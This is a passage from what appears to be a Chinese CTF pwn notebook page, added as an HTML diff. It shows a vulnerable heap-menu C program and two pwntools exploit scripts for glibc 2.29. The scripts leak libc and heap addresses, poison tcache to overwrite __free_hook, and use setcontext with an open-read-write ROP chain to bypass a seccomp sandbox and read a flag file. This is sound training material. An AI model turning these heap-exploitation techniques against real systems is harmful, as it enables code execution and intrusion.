+    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;idx:&quot;</span>);
+    <span class="hljs-built_in">scanf</span>(<span class="hljs-string">&quot;%d&quot;</span>,&amp;idx);
+    <span class="hljs-keyword">if</span>(idx&gt;count){
+        <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;error!&quot;</span>);
+        <span class="hljs-built_in">exit</span>(<span class="hljs-number">0</span>);
+    }
+    write(<span class="hljs-number">1</span>,Nodes[idx],Nodes_len[idx]);
+}
+<span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">gift</span><span class="hljs-params">()</span></span>{
+    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;heap_base:%p\n&quot;</span>,Nodes[<span class="hljs-number">0</span>]);
+}
+<span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">menu</span><span class="hljs-params">()</span></span>{
+    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;1.add&quot;</span>);
+    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;2.delete&quot;</span>);
+    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;3.edit&quot;</span>);
+    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;4.show&quot;</span>);
+    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;5.gift&quot;</span>);
+    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;6.exit&quot;</span>);
+    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;choice:&quot;</span>);
+}
+<span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">init</span><span class="hljs-params">()</span> </span>{
+    setvbuf(<span class="hljs-built_in">stdin</span>, <span class="hljs-number">0L</span>L, <span class="hljs-number">2</span>, <span class="hljs-number">0L</span>L);
+    setvbuf(<span class="hljs-built_in">stdout</span>, <span class="hljs-number">0L</span>L, <span class="hljs-number">2</span>, <span class="hljs-number">0L</span>L);
+    setvbuf(<span class="hljs-built_in">stderr</span>, <span class="hljs-number">0L</span>L, <span class="hljs-number">2</span>, <span class="hljs-number">0L</span>L);
+}
+
+<span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span>{
+    init();
+    sandbox();
+    <span class="hljs-keyword">while</span>(<span class="hljs-number">1</span>){
+        <span class="hljs-keyword">int</span> choice;
+        menu();
+        choice = get_atoi();
+        <span class="hljs-keyword">switch</span>(choice){
+            <span class="hljs-keyword">case</span> <span class="hljs-number">1</span>:
+                add();
+                <span class="hljs-keyword">break</span>;
+            <span class="hljs-keyword">case</span> <span class="hljs-number">2</span>:
+                del();
+                <span class="hljs-keyword">break</span>;
+            <span class="hljs-keyword">case</span> <span class="hljs-number">3</span>:
+                edit();
+                <span class="hljs-keyword">break</span>;
+            <span class="hljs-keyword">case</span> <span class="hljs-number">4</span>:
+                show();
+                <span class="hljs-keyword">break</span>;
+            <span class="hljs-keyword">case</span> <span class="hljs-number">5</span>:
+                gift();
+                <span class="hljs-keyword">break</span>;
+            <span class="hljs-keyword">default</span>:
+                <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;invalued input!&quot;</span>);
+                <span class="hljs-built_in">exit</span>(<span class="hljs-number">0</span>); 
+        }
+    }
+    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;
+}
+</code></pre>
+<h4 id="&#x65B9;&#x6CD5;&#x4E00;">&#x65B9;&#x6CD5;&#x4E00;</h4>
+<p>2.29&#x4E4B;&#x540E;setcontext&#x6709;&#x6240;&#x6539;&#x53D8;&#xFF0C;&#x53C2;&#x6570;&#x4F20;&#x9012;&#x7531;rdi&#x53D8;&#x6210;&#x4E86;rdx&#xFF0C;&#x6240;&#x4EE5;&#x9700;&#x8981;&#x63A7;&#x5236;rdx&#x5BC4;&#x5B58;&#x5668;&#x6307;&#x5411;SigreturnFrame&#x3002;</p>
+<p>&#x8FD9;&#x91CC;&#x7528;&#x5230;&#x4E86;&#x4E00;&#x6761;&#x795E;&#x5947;&#x7684;gadgets</p>
+<p><img src="1.png" alt=""></p>
+<pre><code class="lang-assembly">mov rdx, qword ptr [rdi + 8];
+mov rax, qword ptr [rdi];
+mov rdi, rdx;
+jmp rax;
+</code></pre>
+<p>&#x601D;&#x8DEF;&#xFF1A;</p>
+<p>&#x628A;free_hook&#x6307;&#x5411;&#x8FD9;&#x4E2A;gadgets&#xFF0C;&#x4E4B;&#x540E;&#x5229;&#x7528;&#x601D;&#x8DEF;&#x548C;&#x4E4B;&#x524D;&#x7C7B;&#x4F3C;</p>
+<p>exp1</p>
+<p>rop&#x94FE;&#x5199;&#x5728;&#x5806;&#x4E0A;</p>
+<pre><code class="lang-python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span>*
+context.log_level = <span class="hljs-string">&apos;debug&apos;</span>
+p = process(<span class="hljs-string">&apos;./a.out&apos;</span>)
+libc = ELF(<span class="hljs-string">&apos;/home/tty18pwn/Desktop/glibc-all-in-one-master/libs/2.29-0ubuntu2_amd64/libc-2.29.so&apos;</span>)
+elf = ELF(<span class="hljs-string">&apos;./a.out&apos;</span>)
+context.arch = <span class="hljs-string">&apos;amd64&apos;</span>
+<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">pr</span><span class="hljs-params">(a,addr)</span>:</span>
+    log.success(a+<span class="hljs-string">&apos;====&gt;&apos;</span>+hex(addr))
+<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">add</span><span class="hljs-params">(length)</span>:</span>
+    p.sendlineafter(<span class="hljs-string">&apos;:&apos;</span>,<span class="hljs-string">&apos;1&apos;</span>)
+    p.sendlineafter(<span class="hljs-string">&apos;len:&apos;</span>,str(length))
+<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">delete</span><span class="hljs-params">(idx)</span>:</span>
+    p.sendlineafter(<span class="hljs-string">&apos;:&apos;</span>,<span class="hljs-string">&apos;2&apos;</span>)
+    p.sendlineafter(<span class="hljs-string">&apos;idx:&apos;</span>,str(idx))
+<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">edit</span><span class="hljs-params">(idx,ct)</span>:</span>
+    p.sendlineafter(<span class="hljs-string">&apos;:&apos;</span>,<span class="hljs-string">&apos;3&apos;</span>)
+    p.sendlineafter(<span class="hljs-string">&apos;idx:&apos;</span>,str(idx))
+    p.send(ct)
+<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">show</span><span class="hljs-params">(idx)</span>:</span>
+    p.sendlineafter(<span class="hljs-string">&apos;:&apos;</span>,<span class="hljs-string">&apos;4&apos;</span>)
+    p.sendlineafter(<span class="hljs-string">&apos;idx:&apos;</span>,str(idx))
+add(<span class="hljs-number">0x500</span>) <span class="hljs-comment">#0</span>
+add(<span class="hljs-number">0x10</span>) <span class="hljs-comment">#1</span>
+delete(<span class="hljs-number">0</span>)
+show(<span class="hljs-number">0</span>)
+
+leak = u64(p.recv(<span class="hljs-number">6</span>)+<span class="hljs-string">&apos;\x00&apos;</span>*<span class="hljs-number">2</span>)
+p.sendlineafter(<span class="hljs-string">&apos;:&apos;</span>,<span class="hljs-string">&apos;5&apos;</span>)
+p.recvuntil(<span class="hljs-string">&apos;heap_base:&apos;</span>)
+heapbase = int(p.recvuntil(<span class="hljs-string">&apos;\n&apos;</span>)[:<span class="hljs-number">-1</span>],<span class="hljs-number">16</span>)<span class="hljs-number">-0x260</span>
+libcbase = leak - (<span class="hljs-number">0x7fb553f5cca0</span><span class="hljs-number">-0x00007fb553d78000</span>)
+free_hook = libcbase + libc.sym[<span class="hljs-string">&apos;__free_hook&apos;</span>]
+pr(<span class="hljs-string">&apos;libcbase&apos;</span>,libcbase)
+pr(<span class="hljs-string">&apos;heapbase&apos;</span>,heapbase)
+gadgets = libcbase + <span class="hljs-number">0x000000000012be97</span>
+setcontext_door = libcbase + libc.sym[<span class="hljs-string">&apos;setcontext&apos;</span>]+<span class="hljs-number">53</span>
+
+delete(<span class="hljs-number">1</span>)
+edit(<span class="hljs-number">1</span>,p64(free_hook))
+
+add(<span class="hljs-number">0x10</span>)<span class="hljs-comment">#2</span>
+add(<span class="hljs-number">0x10</span>)<span class="hljs-comment">#3</span>
+edit(<span class="hljs-number">3</span>,p64(gadgets))
+
+<span class="hljs-comment">#===============================================</span>
+prdi_ret = libcbase+<span class="hljs-number">0x0000000000026542</span>
+prsi_ret = libcbase+<span class="hljs-number">0x0000000000026f9e</span>
+prdx_ret = libcbase+<span class="hljs-number">0x000000000012bda6</span>
+ret = libcbase+libc.search(asm(<span class="hljs-string">&quot;ret&quot;</span>)).next()
+<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">ropchain</span><span class="hljs-params">(function,arg1,arg2,arg3)</span>:</span>
+    ret  = p64(prdi_ret)+p64(arg1)
+    ret += p64(prsi_ret)+p64(arg2)
+    ret += p64(prdx_ret)+p64(arg3)
+    ret += p64(function)
+    <span class="hljs-keyword">return</span> ret
+read_addr = libcbase + libc.sym[<span class="hljs-string">&apos;read&apos;</span>]
+open_addr = libcbase + libc.sym[<span class="hljs-string">&apos;open&apos;</span>]
+write_addr = libcbase + libc.sym[<span class="hljs-string">&apos;write&apos;</span>]
+
+rop_addr = heapbase + <span class="hljs-number">0x260</span>+<span class="hljs-number">0x100</span>
+flag_string_addr = rop_addr + <span class="hljs-number">0x200</span>
+payload = ropchain(open_addr,flag_string_addr,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>)
+payload += ropchain(read_addr,<span class="hljs-number">3</span>,flag_string_addr,<span class="hljs-number">0x30</span>)
+payload += ropchain(write_addr,<span class="hljs-number">1</span>,flag_string_addr,<span class="hljs-number">0x30</span>)
+payload = payload.ljust(<span class="hljs-number">0x200</span>,<span class="hljs-string">&apos;\x00&apos;</span>)+<span class="hljs-string">&apos;./flag\x00&apos;</span>
+
+<span class="hljs-comment">#=========================setcontext===========================</span>
+frame = SigreturnFrame()
+
+frame.rsi=rop_addr
+frame.rsp=rop_addr 
+frame.rip=libcbase + libc.sym[<span class="hljs-string">&apos;setcontext&apos;</span>]+<span class="hljs-number">127</span>
+
+add(<span class="hljs-number">0x500</span>) <span class="hljs-comment">#4</span>
+edit(<span class="hljs-number">4</span>,p64(setcontext_door)+p64(heapbase+<span class="hljs-number">0x260</span>)+str(frame).ljust(<span class="hljs-number">0x100</span>,<span class="hljs-string">&apos;\x00&apos;</span>)[<span class="hljs-number">0x10</span>:]+payload)
+<span class="hljs-comment">#gdb.attach(p,&apos;b *&apos;+str(gadgets))</span>
+<span class="hljs-comment">#pause()</span>
+delete(<span class="hljs-number">4</span>)
+
+p.interactive()
+</code></pre>
+<p>exp2</p>
+<p>rop&#x94FE;&#x5199;&#x5728;free_hook&#x9644;&#x8FD1;</p>
+<pre><code class="lang-python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span>*
+context.log_level = <span class="hljs-string">&apos;debug&apos;</span>
+p = process(<span class="hljs-string">&apos;./a.out&apos;</span>)
+libc = ELF(<span class="hljs-string">&apos;/home/tty18pwn/Desktop/glibc-all-in-one-master/libs/2.29-0ubuntu2_amd64/libc-2.29.so&apos;</span>)
+elf = ELF(<span class="hljs-string">&apos;./a.out&apos;</span>)
+context.arch = <span class="hljs-string">&apos;amd64&apos;</span>
+<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">pr</span><span class="hljs-params">(a,addr)</span>:</span>
+    log.success(a+<span class="hljs-string">&apos;====&gt;&apos;</span>+hex(addr))
+<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">add</span><span class="hljs-params">(length)</span>:</span>
+    p.sendlineafter(<span class="hljs-string">&apos;:&apos;</span>,<span class="hljs-string">&apos;1&apos;</span>)
+    p.sendlineafter(<span class="hljs-string">&apos;len:&apos;</span>,str(length))
+<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">delete</span><span class="hljs-params">(idx)</span>:</span>
+    p.sendlineafter(<span class="hljs-string">&apos;:&apos;</span>,<span class="hljs-string">&apos;2&apos;</span>)
+    p.sendlineafter(<span class="hljs-string">&apos;idx:&apos;</span>,str(idx))
+<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">edit</span><span class="hljs-params">(idx,ct)</span>:</span>
+    p.sendlineafter(<span class="hljs-string">&apos;:&apos;</span>,<span class="hljs-string">&apos;3&apos;</span>)
+    p.sendlineafter(<span class="hljs-string">&apos;idx:&apos;</span>,str(idx))
+    p.send(ct)
+<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">show</span><span class="hljs-params">(idx)</span>:</span>
+    p.sendlineafter(<span class="hljs-string">&apos;:&apos;</span>,<span class="hljs-string">&apos;4&apos;</span>)
+    p.sendlineafter(<span class="hljs-string">&apos;idx:&apos;</span>,str(idx))
+add(<span class="hljs-number">0x500</span>) <span class="hljs-comment">#0</span>
+add(<span class="hljs-number">0x10</span>) <span class="hljs-comment">#1</span>
+delete(<span class="hljs-number">0</span>)
+show(<span class="hljs-number">0</span>)
+
+leak = u64(p.recv(<span class="hljs-number">6</span>)+<span class="hljs-string">&apos;\x00&apos;</span>*<span class="hljs-number">2</span>)
+p.sendlineafter(<span class="hljs-string">&apos;:&apos;</span>,<span class="hljs-string">&apos;5&apos;</span>)
+p.recvuntil(<span class="hljs-string">&apos;heap_base:&apos;</span>)
+heapbase = int(p.recvuntil(<span class="hljs-string">&apos;\n&apos;</span>)[:<span class="hljs-number">-1</span>],<span class="hljs-number">16</span>)<span class="hljs-number">-0x260</span>
+libcbase = leak - (<span class="hljs-number">0x7fb553f5cca0</span><span class="hljs-number">-0x00007fb553d78000</span>)
+free_hook = libcbase + libc.sym[<span class="hljs-string">&apos;__free_hook&apos;</span>]
+pr(<span class="hljs-string">&apos;libcbase&apos;</span>,libcbase)
+pr(<span class="hljs-string">&apos;heapbase&apos;</span>,heapbase)
+gadgets = libcbase + <span class="hljs-number">0x000000000012be97</span>
+setcontext_door = libcbase + libc.sym[<span class="hljs-string">&apos;setcontext&apos;</span>]+<span class="hljs-number">53</span>
+
+delete(<span class="hljs-number">1</span>)
+edit(<span class="hljs-number">1</span>,p64(free_hook))
+
+add(<span class="hljs-number">0x10</span>)<span class="hljs-comment">#2</span>
+add(<span class="hljs-number">0x10</span>)<span class="hljs-comment">#3</span>
+edit(<span class="hljs-number">3</span>,p64(gadgets))
+
+<span class="hljs-comment">#=========================setcontext===========================</span>
+rop_addr = free_hook &amp; <span class="hljs-number">0xffffffffffffffff</span>
+frame = SigreturnFrame()
+
+frame.rax=<span class="hljs-number">0</span>
+frame.rdi=<span class="hljs-number">0</span>
+frame.rsi=rop_addr
+frame.rdx=<span class="hljs-number">0x300</span>
+frame.rsp=rop_addr 
+frame.rip= libcbase+<span class="hljs-number">0xcf6c5</span><span class="hljs-comment">#syscall;ret;</span>
+
+<span class="hljs-comment">#===============================================</span>
+prdi_ret = libcbase+<span class="hljs-number">0x0000000000026542</span>
+prsi_ret = libcbase+<span class="hljs-number">0x0000000000026f9e</span>
+prdx_ret = libcbase+<span class="hljs-number">0x000000000012bda6</span>
+ret = libcbase+libc.search(asm(<span class="hljs-string">&quot;ret&quot;</span>)).next()
+<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">ropchain</span><span class="hljs-params">(function,arg1,arg2,arg3)</span>:</span>
+    ret  = p64(prdi_ret)+p64(arg1)
+    ret += p64(prsi_ret)+p64(arg2)
+    ret += p64(prdx_ret)+p64(arg3)
+    ret += p64(function)
+    <span class="hljs-keyword">return</span> ret
+read_addr = libcbase + libc.sym[<span class="hljs-string">&apos;read&apos;</span>]
+open_addr = libcbase + libc.sym[<span class="hljs-string">&apos;open&apos;</span>]
+write_addr = libcbase + libc.sym[<span class="hljs-string">&apos;write&apos;</span>]
+
+flag_string_addr = rop_addr + <span class="hljs-number">0x200</span>
+payload = ropchain(open_addr,flag_string_addr,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>)
+payload += ropchain(read_addr,<span class="hljs-number">3</span>,flag_string_addr,<span class="hljs-number">0x30</span>)
+payload += ropchain(write_addr,<span class="hljs-number">1</span>,flag_string_addr,<span class="hljs-number">0x30</span>)
+payload = payload.ljust(<span class="hljs-number">0x200</span>,<span class="hljs-string">&apos;\x00&apos;</span>)+<span class="hljs-string">&apos;./flag\x00&apos;</span>
+
+
+add(<span class="hljs-number">0x500</span>) <span class="hljs-comment">#4</span>
+edit(<span class="hljs-number">4</span>,p64(setcontext_door)+p64(heapbase+<span class="hljs-number">0x260</span>)+str(frame).ljust(<span class="hljs-number">0x100</span>,<span class="hljs-string">&apos;\x00&apos;</span>)[<span class="hljs-number">0x10</span>:])
+<span class="hljs-comment">#gdb.attach(p,&apos;b *&apos;+str(gadgets))</span>
+
+delete(<span class="hljs-number">4</span>)
+pause()
+p.send(payload)
+p.interactive()
+</code></pre>
+
+                                
+                                </section>
+                            
+    </div>
+    <div class="search-results">
+        <div class="has-results">
+            
+            <h1 class="search-results-title"><span class='search-results-count'></span> results matching "<span class='search-query'></span>"</h1>
+            <ul class="search-results-list"></ul>
+            
+        </div>
+        <div class="no-results">
+            
+            <h1 class="search-results-title">No results matching "<span class='search-query'></span>"</h1>
+            
+        </div>
+    </div>
+</div>
+
+                        </div>
+                    </div>
+                
+            </div>
+
+            
+                
+                <a href="../glibc2.27下堆题绕过沙箱/glibc2.27下堆题绕过沙箱.html" class="navigation navigation-prev " aria-label="Previous page: glibc2.27下堆题绕过沙箱">
+                    <i class="fa fa-angle-left"></i>
+                </a>
+                
+                
+                <a href="../glibc2.31下堆题绕过沙箱/glibc2.31下堆题绕过沙箱.html" class="navigation navigation-next " aria-label="Next page: glibc2.31下堆题绕过沙箱">
+                    <i class="fa fa-angle-right"></i>
+                </a>
+                
+            
+        
+    </div>
+
+    <script>
+        var gitbook = gitbook || [];
+        gitbook.push(function() {
+            gitbook.page.hasChanged({"page":{"title":"glibc2.29下堆题绕过沙箱","level":"1.2.6.2","depth":3,"next":{"title":"glibc2.31下堆题绕过沙箱","level":"1.2.6.3","depth":3,"path":"pwn/沙箱/glibc2.31下堆题绕过沙箱/glibc2.31下堆题绕过沙箱.md","ref":"pwn/沙箱/glibc2.31下堆题绕过沙箱/glibc2.31下堆题绕过沙箱.md","articles":[]},"previous":{"title":"glibc2.27下堆题绕过沙箱","level":"1.2.6.1","depth":3,"path":"pwn/沙箱/glibc2.27下堆题绕过沙箱/glibc2.27下堆题绕过沙箱.md","ref":"pwn/沙箱/glibc2.27下堆题绕过沙箱/glibc2.27下堆题绕过沙箱.md","articles":[]},"dir":"ltr"},"config":{"plugins":["-sharing","sharing-plus","-search","search-pro","code","expandable-chapters","livereload"],"styles":{"website":"styles/website.css","pdf":"styles/pdf.css","epub":"styles/epub.css","mobi":"styles/mobi.css","ebook":"styles/ebook.css","print":"styles/print.css"},"pluginsConfig":{"livereload":{},"search-pro":{},"sharing-plus":{"qq":false,"all":["facebook","google","twitter","instapaper","linkedin","pocket","stumbleupon"],"douban":false,"facebook":true,"weibo":false,"instapaper":false,"whatsapp":false,"hatenaBookmark":false,"twitter":true,"messenger":false,"line":false,"vk":false,"pocket":true,"google":false,"viber":false,"stumbleupon":false,"qzone":false,"linkedin":false},"lunr":{"maxIndexSize":1000000,"ignoreSpecialCharacters":false},"code":{"copyButtons":true},"fontsettings":{"theme":"white","family":"sans","size":2},"highlight":{},"sharing":{"qq":false,"all":["facebook","google","twitter","weibo","qq","linkedin","qzone","douban"],"douban":false,"facebook":false,"weibo":false,"instapaper":false,"whatsapp":false,"hatenaBookmark":false,"twitter":false,"messenger":false,"line":false,"vk":false,"pocket":false,"google":false,"viber":false,"stumbleupon":false,"qzone":false,"linkedin":false},"theme-default":{"styles":{"website":"styles/website.css","pdf":"styles/pdf.css","epub":"styles/epub.css","mobi":"styles/mobi.css","ebook":"styles/ebook.css","print":"styles/print.css"},"showLevel":false},"expandable-chapters":{}},"theme":"default","author":"TTY","lang":"zh-cn","pdf":{"pageNumbers":true,"fontSize":12,"fontFamily":"Arial","paperSize":"a4","chapterMark":"pagebreak","pageBreaksBefore":"/","margin":{"right":62,"left":62,"top":56,"bottom":56}},"structure":{"langs":"LANGS.md","readme":"README.md","glossary":"GLOSSARY.md","summary":"SUMMARY.md"},"variables":{},"title":"Gitbook电子书","gitbook":"*","description":"Gitbook电子书示例项目"},"file":{"path":"pwn/沙箱/glibc2.29下堆题绕过沙箱/glibc2.29下堆题绕过沙箱.md","mtime":"2021-05-13T11:52:40.000Z","type":"markdown"},"gitbook":{"version":"3.2.3","time":"2022-12-04T09:49:46.732Z"},"basePath":"../../..","book":{"language":""}});
+        });
+    </script>
+</div>
+
+        
+    <script src="../../../gitbook/gitbook.js"></script>
+    <script src="../../../gitbook/theme.js"></script>
+    
+        
+        <script src="../../../gitbook/gitbook-plugin-sharing-plus/buttons.js"></script>
+        
+    
+        
+        <script src="../../../gitbook/gitbook-plugin-search-pro/jquery.mark.min.js"></script>
+        
+    
+        
+        <script src="../../../gitbook/gitbook-plugin-search-pro/search.js"></script>
+        
+    
+        
+        <script src="../../../gitbook/gitbook-plugin-code/plugin.js"></script>
+        
+    
+        
+        <script src="../../../gitbook/gitbook-plugin-expandable-chapters/expandable-chapters.js"></script>
+        
+    
+        
+        <script src="../../../gitbook/gitbook-plugin-livereload/plugin.js"></script>
+        
+    
+        
+        <script src="../../../gitbook/gitbook-plugin-lunr/lunr.min.js"></script>
+        
+    
+        
+        <script src="../../../gitbook/gitbook-plugin-lunr/search-lunr.js"></script>
+        
+    
+        
+        <script src="../../../gitbook/gitbook-plugin-fontsettings/fontsettings.js"></script>
+        
+    
+
+    </body>
+</html>
+
